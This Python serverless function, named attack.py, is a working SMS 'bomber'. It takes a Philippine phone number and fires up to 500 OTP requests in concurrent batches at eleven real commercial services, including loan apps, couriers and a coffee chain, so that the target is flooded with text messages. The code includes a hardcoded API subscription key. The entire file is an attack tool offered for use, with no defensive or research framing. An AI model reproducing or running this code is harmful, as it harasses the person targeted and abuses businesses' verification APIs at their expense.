# api/attack.py
import json
import asyncio
import aiohttp
import random
import math

SERVICES = ["EZLOAN","XPRESS","ABENSON","EXCELLENT_LENDING","FORTUNE_PAY","WEMOVE","LBC","PICKUP_COFFEE","HONEY_LOAN","KOMO_PH","S5_OTP"]
MAX_SMS = 500
BATCH_SIZE = 150  # Max per batch to stay under 10s

def normalize(p):
    p = p.replace(" ","").replace("-","")
    if p.startswith("0"): p = "+63"+p[1:]
    if p.startswith("63"): p = "+"+p
    if len(p)==10 and p[0] in "89": p = "+63"+p
    return p if p.startswith("+639") and len(p)==13 else ""

async def send(svc, session, phone):
    try:
        if svc=="EZLOAN":
            await session.post("https://gateway.ezloancash.ph/security/auth/otp/request",json={"businessId":"EZLOAN","contactNumber":phone[1:]},timeout=5)
        elif svc=="XPRESS":
            await session.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",json={"Phone":phone,"Email":f"user{random.randint(100000,999999)}@gmail.com","Password":"Pass1234","FingerprintVisitorId":"TPt0yCuOFim3N3rzvrL1","FingerprintRequestId":"1757149666261.Rr1VvG"},timeout=5)
        elif svc=="ABENSON":
            await session.post("https://api.mobile.abenson.com/api/public/membership/activate_otp",data={"contact_no":phone[1:]},timeout=5)
        elif svc=="EXCELLENT_LENDING":
            await session.post("https://api.excellenteralending.com/dllin/union/rehabilitation/dock",json={"domain":phone[1:],"cat":"login"},timeout=5)
        elif svc=="FORTUNE_PAY":
            await session.post("https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register",json={"phoneNumber":phone[4:],"dialCode":"+63"},timeout=5)
        elif svc=="WEMOVE":
            await session.post("https://api.wemove.com.ph/auth/users",json={"phone_country":"+63","phone_no":phone[4:]},timeout=5)
        elif svc=="LBC":
            await session.post("https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification",data={"client_contact_no":phone[4:],"client_contact_code":"+63"},timeout=5)
        elif svc=="PICKUP_COFFEE":
            await session.post("https://production.api.pickup-coffee.net/v2/customers/login",json={"mobile_number":phone},timeout=5)
        elif svc=="HONEY_LOAN":
            await session.post("https://api.honeyloan.ph/api/client/registration/step-one",json={"phone":phone[1:]},timeout=5)
        elif svc=="KOMO_PH":
            await session.post("https://api.komo.ph/api/otp/v5/generate",json={"mobile":phone[1:]},headers={"Ocp-Apim-Subscription-Key":"cfde6d29634f44d3b81053ffc6298cba"},timeout=5)
        elif svc=="S5_OTP":
            await session.post("https://api.s5.com/player/api/v1/otp/request",data=f"phone_number={phone}",timeout=5)
        return True
    except:
        return False

async def run_batch(session, phone, num_requests):
    # Fire num_requests requests across services in parallel
    tasks = []
    for _ in range(num_requests):
        svc = random.choice(SERVICES)  # Random service for variety
        tasks.append(send(svc, session, phone))
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    success = sum(1 for r in results if r is True)
    failed = len(results) - success
    return success, failed

async def attack(target, total_sms):
    phone = normalize(target)
    if not phone:
        return {"error": "Invalid PH number (use 09xxxxxxxxx)"}

    total_sms = min(max(1, total_sms), MAX_SMS)
    batches = math.ceil(total_sms / BATCH_SIZE)
    
    success_total = failed_total = 0
    async with aiohttp.ClientSession() as session:
        for batch_num in range(batches):
            batch_sms = min(BATCH_SIZE, total_sms - (batch_num * BATCH_SIZE))
            success, failed = await run_batch(session, phone, batch_sms)
            success_total += success
            failed_total += failed
            # 0 delay between batches - but asyncio handles concurrency

    return {
        "success": success_total,
        "failed": failed_total,
        "total": total_sms,
        "batches": batches
    }

def handler(req):
    data = json.loads(req.get("body") or "{}")
    target = data.get("target", "").strip()
    sms = int(data.get("sms", 100))

    if not target:
        return {"statusCode": 400, "body": json.dumps({"error": "No target"})}

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(attack(target, sms))
    loop.close()

    return {
        "statusCode": 200,
        "headers": {"Content-Type": "application/json"},
        "body": json.dumps(result)
      }
